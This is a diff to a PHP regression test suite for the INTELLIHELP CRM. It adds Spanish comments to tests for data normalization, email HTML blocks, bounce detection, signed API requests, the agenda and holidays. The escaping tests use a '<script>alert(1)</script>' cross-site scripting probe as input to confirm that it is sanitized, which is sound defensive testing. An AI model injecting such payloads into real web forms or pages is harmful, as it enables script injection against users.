@@ -4,25 +4,56 @@ declare(strict_types=1);
 // ============================================================
 //  Batería de tests de regresión — CRM INTELLIHELP
 //
-//  Corre SIN base de datos ni red: prueba la lógica pura, que es donde
-//  aparecen los bugs que se repiten.
+//  Es la suite principal: prueba la lógica pura de app/web/app/ (formatos,
+//  normalización, motor de bloques de correo, rebotes, firma y validación de
+//  la API v1, agenda, feriados, invitaciones .ics, CSV, IP) llamando a las
+//  funciones directamente, sin servidor web, sin MySQL y sin red.
 //
-//  Uso local:     php test/run_tests.php
-//  Contra el server: CRM_SRC=/ruta/al/crm/app php run_tests.php
+//  Contra qué base: contra NINGUNA real. La parte que necesita base
+//  (idempotencia de la API, duplicados, límites, anonimización, feriados
+//  sincronizados, reservas rechazadas) corre contra una SQLite en memoria que
+//  se crea y se tira en cada corrida, con funciones q()/q1()/qv() propias que
+//  reemplazan a las de db.php (que acá NO se carga). Nada de lo que hace esta
+//  batería toca producción ni pruebas.
 //
-//  Necesita mbstring y openssl. Lo de la API v1 que usa base (idempotencia,
-//  duplicados, límites) corre contra una SQLite en memoria si está pdo_sqlite;
-//  si no, ese bloque se saltea y lo avisa. En una máquina con PHP sin esas
-//  extensiones cargadas:
-//      php -d extension=mbstring -d extension=openssl -d extension=pdo_sqlite test/run_tests.php
+//  Cómo se corre:
+//    · En la máquina local (Windows, PHP sin extensiones cargadas por
+//      defecto), desde la raíz del repo:
+//        php -d extension_dir="$(dirname "$(which php)")/ext" -d extension=mbstring \
+//            -d extension=openssl -d extension=pdo_sqlite test/run_tests.php
+//      Si el PHP ya trae las extensiones: php test/run_tests.php
+//    · En el servidor lo corre `python bin/deploy.py test [--pruebas]`, que sube
+//      test/ a ~/crm_test y lo ejecuta con CRM_SRC=<webroot>/app, es decir,
+//      contra el código desplegado en esa instalación:
+//        CRM_SRC=/ruta/al/crm/app php run_tests.php
+//
+//  Necesita mbstring y openssl (cifrado de tokens). Con pdo_sqlite corre el
+//  bloque de base en memoria; sin pdo_sqlite ese bloque se saltea con un aviso
+//  y el resto sigue (OJO: en ese caso el total de pruebas baja y la corrida
+//  igual termina en verde).
+//
+//  Salida: una línea [OK]/[XX] por prueba y el resumen «N pruebas · N
+//  correctas · N fallidas». Código de salida 0 si todo pasó, 1 si algo falló.
+//
+//  Fechas: casi todo usa fechas fijas de 2026; lo que depende de «hoy»
+//  (vencimientos, tokens, feriados del año siguiente) se calcula con time()
+//  y date() en la zona de Buenos Aires.
 //
 //  REGLA DEL PROYECTO: cada defecto que aparece suma un caso acá, para que
 //  no pueda volver.
 // ============================================================
 
+// Que cualquier aviso de PHP se vea en la salida: un warning dentro de una
+// función probada suele ser el primer síntoma de un bug.
 error_reporting(E_ALL);
 ini_set('display_errors', '1');
 
+// ---- Entorno simulado ----
+// Constantes y configuración mínimas que esperan helpers.php y compañía.
+// BASE_PATH '/crm' y la canónica de producción son sólo para armar URLs; no
+// se hace ningún pedido. El secreto 'test-secret' alimenta crm_secret(), así
+// que los hash de IP, el cifrado y los tokens de formulario de acá no sirven
+// en ninguna instalación real.
 if (!defined('BASE_PATH')) { define('BASE_PATH', '/crm'); }
 if (!defined('APP'))       { define('APP', __DIR__); }
 
@@ -44,8 +75,13 @@ $GLOBALS['CONFIG'] = [
     ],
 ];
 
+// La zona de la instalación: de ella dependen los vencimientos, las
+// ventanas de la agenda y la hora de los feriados.
 date_default_timezone_set('America/Argentina/Buenos_Aires');
 
+// Código bajo prueba. CRM_SRC permite apuntar a otra copia (en el servidor,
+// la desplegada). No se carga db.php ni bootstrap.php: la base, si hace
+// falta, la simula el bloque SQLite de más abajo.
 $SRC = getenv('CRM_SRC') ?: (__DIR__ . '/../app/web/app');
 require $SRC . '/helpers.php';
 require $SRC . '/crm.php';
@@ -63,27 +99,47 @@ require $SRC . '/agenda.php';
 require $SRC . '/api.php';
 
 // ---- Andamiaje mínimo ----
+// Contadores globales: $T total, $F fallidas, $fallos nombres para el resumen.
 $T = 0; $F = 0; $fallos = [];
 
+/**
+ * Registra una prueba booleana e imprime [OK] o [XX].
+ *
+ * Ojo: varias llamadas de abajo le pasan un tercer argumento con un detalle
+ * (tamaño, conteo). PHP lo acepta pero la función lo IGNORA: ese detalle
+ * nunca se imprime.
+ *
+ * @param string $nombre qué se comprueba, en lenguaje de negocio
+ * @param bool   $cond   true si la comprobación pasó
+ */
 function ok(string $nombre, bool $cond): void {
     global $T, $F, $fallos;
     $T++;
     if ($cond) { echo "  [OK] $nombre\n"; }
     else { $F++; $fallos[] = $nombre; echo "  [XX] $nombre\n"; }
 }
+/**
+ * Igualdad estricta (===). El nombre impreso lleva el valor esperado y el
+ * obtenido, para diagnosticar sin volver a correr.
+ */
 function eq(string $nombre, $got, $exp): void {
     ok($nombre . '  [esperado=' . var_export($exp, true) . ' obtenido=' . var_export($got, true) . ']', $got === $exp);
 }
+/** Igualdad de números con tolerancia de 0,001 (para importes y decimales). */
 function feq(string $nombre, $got, $exp): void {
     ok($nombre . "  [esperado=$exp obtenido=$got]", abs(((float)$got) - ((float)$exp)) < 0.001);
 }
+/** La salida $pajar contiene el texto $aguja. */
 function contiene(string $nombre, string $pajar, string $aguja): void {
     ok($nombre, str_contains($pajar, $aguja));
 }
+/** La salida $pajar NO contiene el texto $aguja. */
 function no_contiene(string $nombre, string $pajar, string $aguja): void {
     ok($nombre, !str_contains($pajar, $aguja));
 }
 
+// normalizar_provincia() (crm.php): la usa el importador de Zoho para que
+// «CABA», «C.A.B.A.» o «Federal District» terminen en una sola provincia.
 echo "== Normalización de provincias (datos reales del CSV de Zoho) ==\n";
 eq('CABA',                        normalizar_provincia('CABA'), 'Ciudad de Buenos Aires');
 eq('CIUDAD DE BUENOS AIRES',      normalizar_provincia('CIUDAD DE BUENOS AIRES'), 'Ciudad de Buenos Aires');
@@ -99,6 +155,7 @@ eq('SANTIAGO DEL ESTERO',         normalizar_provincia('SANTIAGO DEL ESTERO'), '
 eq('vacío -> null',               normalizar_provincia(''), null);
 eq('desconocida se conserva',     normalizar_provincia('São Paulo'), 'São Paulo');
 
+// normalizar_pais() (crm.php): unifica nombres y descarta basura del CSV.
 echo "== Normalización de países ==\n";
 eq('ARGENTINA',                   normalizar_pais('ARGENTINA'), 'Argentina');
 eq('Argentina',                   normalizar_pais('Argentina'), 'Argentina');
@@ -107,6 +164,8 @@ eq('Brazil -> Brasil',            normalizar_pais('Brazil'), 'Brasil');
 eq('URL en el campo país se descarta', normalizar_pais('http://www.pecanargentina.com/'), null);
 eq('texto larguísimo se descarta', normalizar_pais('Team Leadership, Business Strategy, Negotiation and more'), null);
 
+// normalizar_localidad() (crm.php): el CSV de Zoho trae aptitudes de
+// LinkedIn, direcciones y URLs en el campo localidad.
 echo "== Limpieza de localidad (basura del CSV real) ==\n";
 eq('localidad normal',            normalizar_localidad('9 DE JULIO'), '9 DE JULIO');
 eq('aptitudes de LinkedIn se descartan',
@@ -116,6 +175,7 @@ eq('dirección completa se descarta',
 eq('URL se descarta',             normalizar_localidad('https://carvajaltys.com.ar'), null);
 eq('vacío -> null',               normalizar_localidad('   '), null);
 
+// validar_cuit() / normalizar_cuit() / formatear_cuit() (helpers.php).
 echo "== CUIT (módulo 11) ==\n";
 eq('válido 30-71420341-6',        validar_cuit('30714203416'), true);
 eq('válido con guiones',          validar_cuit('30-71420341-6'), true);
@@ -124,11 +184,14 @@ eq('10 dígitos',                  validar_cuit('3071420341'), false);
 eq('normaliza',                   normalizar_cuit('30-71420341-6'), '30714203416');
 eq('formatea',                    formatear_cuit('30714203416'), '30-71420341-6');
 
+// money() (helpers.php): formato argentino, punto de miles y coma decimal.
 echo "== Formato de importes ==\n";
 eq('ARS',                         money(1234.5), '$ 1.234,50');
 eq('USD',                         money(1000, 'USD'), 'US$ 1.000,00');
 eq('cero',                        money(0), '$ 0,00');
 
+// url(), url_abs() y google_redirect_uri(): si la URI de retorno de Google no
+// coincide letra por letra con la registrada, el ingreso falla.
 echo "== URLs (la dirección oficial es intellihelp.tech/crm) ==\n";
 eq('url interna respeta BASE_PATH', url('contactos'), '/crm/contactos');
 eq('url con barra inicial',       url('/contactos'), '/crm/contactos');
@@ -137,6 +200,7 @@ ok('redirect_uri de Google es HTTPS (evita redirect_uri_mismatch)',
    str_starts_with(google_redirect_uri(), 'https://'));
 eq('redirect_uri exacto',         google_redirect_uri(), 'https://intellihelp.tech/crm/google-callback');
 
+// paginar() (helpers.php): página fuera de rango y conjunto vacío.
 echo "== Paginación ==\n";
 $p = paginar(0, 1, 25);
 eq('sin registros hay 1 página',  $p['paginas'], 1);
@@ -145,6 +209,8 @@ eq('offset de la página 3',       $p['offset'], 50);
 $p = paginar(51, 99, 25);
 eq('página fuera de rango se acota', $p['page'], 3);
 
+// render_plantilla() (campanas.php): reemplazo de {{variables}} en asunto y
+// cuerpo de una campaña.
 echo "== Plantillas de campaña ==\n";
 $datos = ['nombre' => 'Juan', 'apellido' => 'Pérez', 'empresa' => 'ACME', 'email' => 'j@acme.com',
           'remitente' => 'Carlos', 'agenda' => 'https://x/agenda', 'baja' => 'https://x/baja'];
@@ -155,6 +221,7 @@ eq('nombre completo',             render_plantilla('{{nombre_completo}}', $datos
 contiene('deja el enlace de baja', render_plantilla('{{baja}}', $datos), 'https://x/baja');
 eq('variable inexistente queda como está', render_plantilla('{{no_existe}}', $datos), '{{no_existe}}');
 
+// es_rebote() (imap.php): decide si un correo entrante es un aviso de rebote.
 echo "== Detección de rebotes (lógica de Pulsemail) ==\n";
 ok('mailer-daemon de Gmail',      es_rebote('mailer-daemon@googlemail.com', 'Delivery Status Notification'));
 ok('postmaster de Exchange',      es_rebote('postmaster@empresa.com', 'Undeliverable'));
@@ -165,6 +232,7 @@ ok('por asunto aunque el remitente no lo diga',
 ok('asunto en castellano',        es_rebote('info@server.com', 'Correo no entregado'));
 ok('un cliente normal NO es rebote', !es_rebote('juan@acme.com', 'Re: propuesta comercial'));
 
+// extraer_destinatario_rebote() (imap.php): a quién se le archiva el contacto.
 echo "== Extracción del destinatario que rebotó ==\n";
 $cuerpo = "Delivery incomplete\r\nFinal-Recipient: rfc822; juan@acme.com\r\nAction: failed\r\n";
 eq('usa Final-Recipient',         extraer_destinatario_rebote($cuerpo)[0] ?? '', 'juan@acme.com');
@@ -173,6 +241,10 @@ eq('normaliza a minúsculas',      extraer_destinatario_rebote($cuerpo2)[0] ?? '
 $cuerpo3 = 'El mensaje para pedro@acme.com no pudo entregarse.';
 ok('fallback: busca cualquier dirección', in_array('pedro@acme.com', extraer_destinatario_rebote($cuerpo3), true));
 
+// bloques_render() (bloques.php) con el preajuste «pulsemail»: el HTML que
+// sale tiene que cumplir las reglas de correo (tablas, estilos en línea,
+// VML para Outlook, sin flex/grid/JS/formularios) y pesar menos de 102 KB,
+// el límite a partir del cual Gmail recorta el mensaje.
 echo "== Motor de bloques: el HTML tiene que sobrevivir en Outlook y en Gmail ==\n";
 $pre  = plantillas_preajustes()['pulsemail'];
 // El contexto de marca real siempre trae estos datos: el preajuste de
@@ -222,6 +294,8 @@ ok('todas las plantillas de servicio comparten colores y estructura', $iguales);
 ok('y cada una dice de qué servicio habla',
    count(array_unique(array_map(fn($k) => $preajustes[$k]['nombre'] ?? '', $servicios))) === count($servicios));
 
+// Bloque «whatsapp»: el enlace oficial api.whatsapp.com/send con número
+// limpio y mensaje codificado; sin número cae al de la empresa.
 echo "== Botón de WhatsApp (formato oficial) ==\n";
 $wa = bloques_render([['tipo' => 'whatsapp', 'telefono' => '54 9 11 5027-4827',
                        'mensaje' => 'Hola, me interesa conocer más sobre sus soluciones.',
@@ -237,6 +311,8 @@ no_contiene('sin número no dibuja el botón',
 $waCtx = bloques_render([['tipo' => 'whatsapp']], [], ['empresa_whatsapp' => '5491150274827']);
 contiene('si no le ponen número usa el de la empresa', $waCtx, 'phone=5491150274827');
 
+// Un bloque «titulo» sin «nivel» dejaba un aviso de índice indefinido. Se
+// captura todo aviso con un manejador temporal y se exige que no haya ninguno.
 echo "== Título sin nivel (correos de la agenda y de las alertas) ==\n";
 $avisos = [];
 set_error_handler(static function (int $n, string $m) use (&$avisos): bool { $avisos[] = $m; return true; });
@@ -245,12 +321,16 @@ restore_error_handler();
 eq('sin nivel no deja avisos de PHP', $avisos, []);
 contiene('y sale con el tamaño del nivel 2', $tit, 'font-size:21px');
 
+// Bloque «agenda»: deja {{agenda}} para resolver al enviar, con el enlace
+// personal del vendedor.
 echo "== Botón de agenda ==\n";
 $ag = bloques_render([['tipo' => 'agenda', 'texto' => 'Agendar reunión']], [], $ctxE);
 contiene('deja la variable para resolver al enviar', $ag, '{{agenda}}');
 contiene('respeta el texto del botón',               $ag, 'Agendar reunión');
 contiene('se dibuja como botón, con respaldo Outlook', $ag, 'v:roundrect');
 
+// Seguridad del correo: el texto escrito por una persona se escapa y los
+// enlaces con esquemas peligrosos se descartan.
 echo "== Escapado dentro del correo (no se puede inyectar HTML) ==\n";
 $sucio = bloques_render([['tipo' => 'texto', 'texto' => '<script>alert(1)</script> & "comillas"']], [], $ctxE);
 no_contiene('el HTML del usuario se escapa',  $sucio, '<script>alert');
@@ -268,11 +348,16 @@ contiene('completa el https:// en un enlace suelto', $buena, 'https://intellihel
 $varia = bloques_render([['tipo' => 'boton', 'texto' => 'X', 'enlace' => '{{agenda}}']], [], $ctxE);
 contiene('deja pasar las variables de plantilla',    $varia, '{{agenda}}');
 
+// bloques_texto(): la alternativa text/plain del correo (mejora la
+// entregabilidad y la leen los clientes sin HTML).
 echo "== Versión en texto plano ==\n";
 $txt = bloques_texto($pre['bloques'], $ctxE);
 ok('genera texto plano',                      strlen($txt) > 100);
 no_contiene('el texto plano no lleva etiquetas', $txt, '<');
 
+// bloques_verificar(): el chequeo previo al envío que muestra la pantalla de
+// la plantilla. Un correo sano no da errores; uno con mayúsculas, palabras
+// de spam, JS, demasiado peso o sólo imágenes, sí.
 echo "== Verificador de entregabilidad ==\n";
 $okChk = bloques_verificar($pre['bloques'], 'Una propuesta para {{empresa}}', $htmlP, $txt, $ctxE);
 ok('un correo sano no da errores',            count($okChk['errores']) === 0,
@@ -289,6 +374,7 @@ $sinTexto = bloques_verificar([], 'Hola', '<html><img src="a"><img src="b"><img 
 ok('detecta demasiada imagen y poco texto',
    (bool) array_filter($sinTexto['errores'], fn($x) => str_contains($x[0], 'poco texto')));
 
+// es_rebote_duro() (imap.php): sólo un rebote definitivo archiva el contacto.
 echo "== Rebote definitivo vs. pasajero (decide si se archiva el contacto) ==\n";
 // Definitivos: la casilla no existe o el dominio no existe. Archivan el contacto.
 ok('DSN con estado 5.x.x',        es_rebote_duro("Action: failed\r\nStatus: 5.1.1\r\nDiagnostic-Code: smtp; 550"));
@@ -302,17 +388,21 @@ ok('DSN con estado 4.x.x',        !es_rebote_duro("Action: delayed\r\nStatus: 4.
 ok('greylisting',                 !es_rebote_duro('451 4.7.1 Greylisted, try again later'));
 ok('ante la duda, pasajero',      !es_rebote_duro('Algo raro pasó con este mensaje'));
 
+// email_valido() / normalizar_email() (helpers.php).
 echo "== Correos ==\n";
 ok('válido',                      email_valido('juan.perez@acme.com.ar'));
 ok('sin arroba no es válido',     !email_valido('juan.perez'));
 eq('se normaliza',                normalizar_email('  Juan@ACME.com  '), 'juan@acme.com');
 
+// slugificar() (agenda.php): la parte final de /r/<usuario>/<tipo>.
 echo "== Slugs de la agenda pública ==\n";
 eq('acentos y espacios',          slugificar('Reunión de presentación'), 'reunion-de-presentacion');
 eq('30 min',                      slugificar('Demo 45 min'), 'demo-45-min');
 eq('vacío tiene respaldo',        slugificar('   '), 'reunion');
 eq('símbolos',                    slugificar('¡Café & Charla!'), 'cafe-charla');
 
+// actividad_vencimiento() (actividades.php): el color del badge según vence_el
+// y completada_en. Usa la fecha de hoy: no son fechas fijas.
 echo "== Vencimiento de actividades ==\n";
 [$txt, $cls] = actividad_vencimiento(['vence_el' => date('Y-m-d H:i:s', strtotime('-2 days')),
                                       'inicia_el' => null, 'completada_en' => null]);
@@ -327,6 +417,7 @@ eq('la de hoy se destaca',        $cls, 'badge-pend');
                                       'inicia_el' => null, 'completada_en' => date('Y-m-d H:i:s')]);
 eq('completada aunque venciera',  $cls, 'badge-ok');
 
+// e(), recortar(), iniciales(), fecha_corta(), fecha_larga() (helpers.php).
 echo "== Escapado y formato ==\n";
 eq('escapa HTML',                 e('<script>'), '&lt;script&gt;');
 eq('escapa comillas',             e('a"b'), 'a&quot;b');
@@ -339,6 +430,7 @@ eq('fecha corta',                 fecha_corta('2026-07-30'), '30/07/2026');
 eq('fecha vacía',                 fecha_corta(null), '—');
 contiene('fecha larga en castellano', fecha_larga('2026-07-30'), 'de julio de 2026');
 
+// badge_envio() / badge_campana() (registros.php): siempre con variante de color.
 echo "== Badges ==\n";
 contiene('envío enviado',         badge_envio('enviado'), 'badge-ok');
 contiene('envío rebotado',        badge_envio('rebotado'), 'badge-rej');
@@ -358,6 +450,8 @@ ok('ninguna columna queda sin alias',
 // canal + desde + los cuatro LIKE de la búsqueda
 eq('los parámetros acompañan al WHERE', count($params), 6);
 
+// cifrar() / descifrar() (google.php): los refresh tokens de Google y los
+// secretos de las claves de API se guardan cifrados con el secreto de la app.
 echo "== Cifrado de los tokens de Google ==\n";
 $claro = 'refresh-token-de-prueba-1234';
 $cifr  = cifrar($claro);
@@ -377,6 +471,7 @@ $p3 = bloques_render([['tipo' => 'texto', 'texto' => '<script>alert(1)</script> 
 ok('el texto de quien escribe no puede inyectar HTML', !str_contains($p3, '<script>'));
 ok('y la dirección sigue funcionando', str_contains($p3, 'href="https://ok.com"'));
 
+// telefono_valido() / normalizar_telefono() (crm.php).
 echo "== Teléfonos ==
 ";
 // `type="tel"` NO valida nada: es sólo una pista para que el celular abra el
@@ -393,12 +488,14 @@ ok('el campo vacío es válido (es opcional)', telefono_valido(''));
 eq('lo que no es teléfono no se guarda a medias', normalizar_telefono('asdasd'), null);
 eq('lo válido se guarda tal cual',    normalizar_telefono('+54 9 11 5027-4827'), '+54 9 11 5027-4827');
 
+// telefono_formato() (helpers.php): presentación legible en los listados.
 echo "== Cómo se muestra un teléfono ==
 ";
 eq('móvil argentino',  telefono_formato('5491150274827'), '+54 9 11 5027-4827');
 eq('vacío',            telefono_formato(''), '');
 eq('lo que no se reconoce se muestra tal cual', telefono_formato('+1 555 0100'), '+1 555 0100');
 
+// ics_plegar() (helpers.php): plegado de líneas del .ics a 75 octetos (RFC 5545).
 echo "== Invitación de calendario (el botón de aceptar del correo) ==\n";
 // El archivo de calendario es lo que hace que Gmail muestre «Sí / No / Quizás».
 // Si se pasa del ancho o corta un acento al medio, el cliente lo descarta y el
@@ -430,6 +527,7 @@ eq('y el texto se recupera entero', rtrim(str_replace("\r\n ", '', $pl), "\r\n")
 //  Entradas desde la web (md/INTEGRACION-WEB.md)
 // ============================================================
 
+// api_firma_canonica(), api_firma(), api_firma_coincide() (api.php).
 echo "== API v1: firma de los pedidos ==\n";
 // Vectores fijos: la web (public/api/_crm.php) tiene que llegar a los mismos
 // valores. Si alguno de los dos lados cambia el texto que se firma, falla acá
@@ -468,6 +566,7 @@ ok('sin secreto no hay firma que valga',
 ok('una firma que no es hexadecimal se rechaza', !$coincide($sec, $ts, 'POST', $ruta, $idem, $iph, $body, str_repeat('z', 64)));
 ok('una firma recortada se rechaza', !$coincide($sec, $ts, 'POST', $ruta, $idem, $iph, $body, substr($firmaOk, 0, 63)));
 
+// api_hora_valida(): el reloj del pedido puede diferir ±300 s, ni uno más.
 $ahora = 1793709000;
 ok('hora actual: válida',             api_hora_valida((string)$ahora, $ahora));
 ok('hace 300 s: todavía válida',      api_hora_valida((string)($ahora - 300), $ahora));
@@ -477,6 +576,9 @@ ok('sin hora: rechazada',             !api_hora_valida('', $ahora));
 ok('con decimales: rechazada',        !api_hora_valida($ahora . '.5', $ahora));
 ok('en milisegundos: rechazada',      !api_hora_valida($ahora . '000', $ahora));
 
+// api_validar_entrada() (api.php): lo que manda la web, campo por campo.
+// $cuerpo() arma un pedido válido de reserva; $cambios se mezcla encima y
+// $sacar quita claves con notación «persona.nombre».
 echo "== API v1: validación de lo que manda la web ==\n";
 $cuerpo = static function (array $cambios = [], array $sacar = []): array {
     $j = array_replace_recursive([
@@ -511,6 +613,7 @@ $cuerpo = static function (array $cambios = [], array $sacar = []): array {
     }
     return $j;
 };
+// Atajo: sólo el arreglo de errores ([1]) de la validación.
 $errores = static fn(array $j, bool $reserva = true): array => api_validar_entrada($j, $reserva)[1];
 
 [$limpio, $err] = api_validar_entrada($cuerpo(), true);
@@ -572,6 +675,9 @@ eq('gclid con espacios: vacío', $lo['origen']['gclid'], '');
 eq('visitas fuera de rango: sin dato', $lo['origen']['visitas_landing'], null);
 ok('las claves de origen desconocidas se ignoran', !array_key_exists('desconocido', $lo['origen']));
 
+// api_cuerpo_hash(): la huella del cuerpo no depende del orden de las claves
+// ni del espaciado. api_respuesta_guardable() / api_previa_respuesta(): qué
+// se contesta cuando llega otra vez una clave de idempotencia ya vista.
 echo "== API v1: idempotencia (la misma reserva no se toma dos veces) ==\n";
 $h1 = api_cuerpo_hash(json_decode('{"b":1,"a":{"y":2,"x":[1,2]}}', true));
 $h2 = api_cuerpo_hash(json_decode("{ \"a\" : { \"x\" : [1, 2], \"y\" : 2 }, \"b\" : 1 }", true));
@@ -595,6 +701,11 @@ $descartada = api_respuesta_guardable(200, ['ok' => true, 'repetida' => true, 'e
 [$c, $dat] = api_previa_respuesta(['id' => 129, 'cuerpo_hash' => $h1, 'estado' => 'descartada', 'respuesta' => $descartada], $h1);
 eq('reintento de una consulta duplicada: la misma respuesta', [$c, $dat['entrada_id']], [200, 90]);
 
+// empresa_clave() (crm.php): la clave para no duplicar empresas («ACME S.A.»
+// y «Acme SA» son la misma). email_dominio_corporativo(): sólo los dominios
+// propios sirven para asociar una empresa. entrada_web_resumen() y
+// entrada_web_vencimiento() (crm.php): la línea de origen y el plazo de
+// respuesta en días hábiles. ip_hash(): la IP con sal de la instalación.
 echo "== Empresas y correos que llegan desde la web ==\n";
 eq('«ACME S.A.» → acme', empresa_clave('ACME S.A.'), 'acme');
 eq('«Acme SA» → acme', empresa_clave('Acme SA'), 'acme');
@@ -624,6 +735,8 @@ ok('la IP se guarda como hash de 64 hex', is_string($ipH) && preg_match('/^[0-9a
 ok('y no es el SHA-256 pelado (lleva el secreto de la instalación)', $ipH !== hash('sha256', '190.2.3.4'));
 eq('sin IP no hay hash', ip_hash(''), null);
 
+// agenda_ventana(), agenda_slots_dia() (agenda.php) y el token antispam del
+// formulario público (agenda_form_token / agenda_form_token_valido).
 echo "== Agenda: ventana, horarios y token del formulario ==\n";
 $tipoP = ['id' => 7, 'zona_horaria' => 'America/Argentina/Buenos_Aires', 'ventana_dias' => 21,
           'duracion_min' => 30, 'margen_min' => 15, 'aviso_min_horas' => 2];
@@ -655,6 +768,8 @@ $mx = agenda_slots_dia('2026-11-03', [['09:00', '09:30']], 1800, 0, 0, [], 'Amer
 eq('el horario se lee en la zona del vendedor', $mx, [(new DateTimeImmutable('2026-11-03 09:00', new DateTimeZone('America/Mexico_City')))->getTimestamp()]);
 eq('una fecha mal escrita no da horarios', agenda_slots_dia('2026-02-30', [['09:00', '12:00']], 1800, 0, 0, [], $zBA), []);
 
+// Arma un token con hora y nonce elegidos, firmado igual que el real, para
+// probar los vencimientos sin esperar.
 $tokenCon = static function (int $tipoId, int $ts, string $uso = 'reservar', string $nonce = '0123456789abcdef'): string {
     return $tipoId . '.' . $ts . '.' . $nonce . '.'
          . hash_hmac('sha256', 'agenda-form|' . $uso . '|' . $tipoId . '|' . $ts . '|' . $nonce, crm_secret());
@@ -678,6 +793,8 @@ $otroNonce = $tokenCon(7, time() - 10, 'reservar', 'fedcba9876543210');
 $cambiado  = implode('.', array_replace(explode('.', $otroNonce), [2 => '0123456789abcdef']));
 ok('cambiar el número al azar invalida la firma', !agenda_form_token_valido($cambiado, 7, $m) && $m === 'invalido');
 
+// agenda_coberturas_leer() / agenda_cobertura_del_dia(): el JSON del ajuste
+// agenda_coberturas, con entradas rotas que tienen que descartarse.
 echo "== Agenda: cobertura por vacaciones ==\n";
 $cobJson = json_encode([
     ['tipo_id' => 4, 'usuario_id' => 4, 'desde' => '2026-11-09', 'hasta' => '2026-11-24'],
@@ -695,6 +812,10 @@ eq('el primer día cubre otro', agenda_cobertura_del_dia($cob, '2026-11-09'), 4)
 eq('el último día también (las fechas van incluidas)', agenda_cobertura_del_dia($cob, '2026-11-24'), 4);
 eq('el día después vuelve solo al dueño', agenda_cobertura_del_dia($cob, '2026-11-25'), null);
 
+// Lógica pura de feriados.php: parseo de la fuente, plan de sincronización
+// (insertar/actualizar/borrar), jurisdicciones y cuándo toca sincronizar.
+// $calendario(año, cambios) devuelve un calendario oficial de juguete con 14
+// feriados; un cambio null quita la fecha.
 echo "== Feriados: calendario oficial, trasladables, regionales y fuente caída ==\n";
 // El formato es el de https://api.argentinadatos.com/v1/feriados/<año>.
 $calendario = static function (int $a, array $cambios = []): array {
@@ -730,6 +851,7 @@ eq('dos feriados el mismo día: un solo día, con los dos nombres',
    feriados_parsear(json_encode([['fecha' => '2026-04-02', 'nombre' => 'Malvinas'], ['fecha' => '2026-04-02', 'nombre' => 'Jueves Santo']]), 2026)['2026-04-02']['nombre'],
    'Malvinas · Jueves Santo');
 
+// Una fila de la tabla feriados tal como la devuelve la base.
 $filaF = static fn(int $id, string $f, string $n, string $t = 'inamovible', string $o = 'auto', int $ig = 0): array
     => ['id' => $id, 'fecha' => $f, 'nombre' => $n, 'tipo' => $t, 'origen' => $o, 'ignorado' => $ig];
 $plan = feriados_planificar($of26, []);
@@ -767,6 +889,7 @@ eq('con la oficina en Córdoba, el de Córdoba sí y el de CABA no', array_keys(
 eq('la etiqueta de un regional dice dónde rige', feriado_etiqueta($rigen['2026-11-09']), 'Visita del papa (sólo Ciudad de Buenos Aires)');
 eq('la de un nacional, sólo el nombre', feriado_etiqueta($rigen['2026-12-08']), 'Inmaculada');
 
+// feriados_toca(ahora, sincronizado_en, ultimo_intento, hay_datos, es_cron).
 $ah = strtotime('2026-11-08 10:00:00');
 $hace = static fn(int $s): string => date('Y-m-d H:i:s', $ah - $s);
 ok('nunca sincronizado: toca', feriados_toca($ah, '', '', false, false));
@@ -788,9 +911,16 @@ ok('el cron sincroniza una vez por día calendario', feriados_toca($ah, '2026-11
 //  Si el PHP no tiene pdo_sqlite, el bloque se saltea y lo dice.
 // ------------------------------------------------------------
 echo "== Base en memoria: idempotencia, duplicados y límite de envíos ==\n";
+// También se saltea si q() ya existe (alguien cargó db.php antes):
+// redeclararla sería un error fatal. El aviso sólo menciona pdo_sqlite.
 if (!extension_loaded('pdo_sqlite') || function_exists('q')) {
     echo "  (salteada: este PHP no tiene pdo_sqlite)\n";
 } else {
+    /**
+     * Conexión a la SQLite en memoria; la primera llamada crea las tablas que
+     * usan las funciones de api.php (api_limites, entradas_web). Reemplaza a
+     * db() de db.php, que no se carga en esta batería.
+     */
     function db(): PDO
     {
         static $pdo = null;
@@ -819,6 +949,13 @@ if (!extension_loaded('pdo_sqlite') || function_exists('q')) {
                     BEGIN UPDATE entradas_web SET creado_en = ahora() WHERE id = NEW.id; END");
         return $pdo;
     }
+    /**
+     * Traduce al vuelo el SQL de MariaDB que usan api.php y feriados.php a SQLite:
+     * NOW() - INTERVAL n UNIDAD, NOW(), <=>, INSERT IGNORE, ON DUPLICATE KEY
+     * UPDATE (sólo para la clave de api_limites) y DELETE ... LIMIT.
+     * Si una función nueva usa otra construcción de MariaDB, la prueba falla con
+     * un error de sintaxis de SQLite: hay que sumarla acá.
+     */
     function sqlite_traducir(string $sql): string
     {
         $mult = ['MINUTE' => 60, 'HOUR' => 3600, 'DAY' => 86400];
@@ -830,6 +967,11 @@ if (!extension_loaded('pdo_sqlite') || function_exists('q')) {
         $sql = (string) preg_replace('/ON DUPLICATE KEY UPDATE/i', 'ON CONFLICT (clave, ventana) DO UPDATE SET', $sql);
         return (string) preg_replace('/^(\s*DELETE\b.*?)\s+LIMIT\s+\d+\s*$/is', '$1', $sql);
     }
+    /**
+     * Igual que q() de db.php: prepara, ejecuta y devuelve el statement.
+     * Una violación de UNIQUE se re-lanza con el código 1062 de MariaDB, que es
+     * el que reconoce entrada_web_guardar() para detectar la idempotencia.
+     */
     function q(string $sql, array $params = []): PDOStatement
     {
         try {
@@ -847,8 +989,11 @@ if (!extension_loaded('pdo_sqlite') || function_exists('q')) {
             throw $e;
         }
     }
+    /** Primera fila o null, como q1() de db.php. */
     function q1(string $sql, array $params = []): ?array { $f = q($sql, $params)->fetch(); return $f === false ? null : $f; }
+    /** Primer valor de la primera fila, como qv() de db.php. */
     function qv(string $sql, array $params = []) { return q($sql, $params)->fetchColumn(); }
+    /** Último id insertado en la conexión, como last_id() de db.php. */
     function last_id(): int { return (int) db()->lastInsertId(); }
     // Los ajustes viven en memoria: las pruebas de feriados los cambian.
     $GLOBALS['__ajustes'] = [];
@@ -859,6 +1004,8 @@ if (!extension_loaded('pdo_sqlite') || function_exists('q')) {
         function setting_set(string $clave, ?string $valor): void { $GLOBALS['__ajustes'][$clave] = $valor; }
     }
 
+    // Una entrada_web completa y válida; $extra pisa las claves que se quieran
+    // cambiar en cada caso.
     $fila = static fn(array $extra = []): array => $extra + [
         'idempotencia' => 'web-prueba-0000000001', 'cuerpo_hash' => $h1, 'token_id' => 1, 'tipo' => 'reserva',
         'nombre' => 'Juana Prueba', 'empresa' => 'Empresa de Prueba SRL', 'email' => 'bsierra@intellihelp.tech',
@@ -868,6 +1015,8 @@ if (!extension_loaded('pdo_sqlite') || function_exists('q')) {
         'tipo_reunion_id' => 3, 'inicio_pedido' => 1793709000,
     ];
 
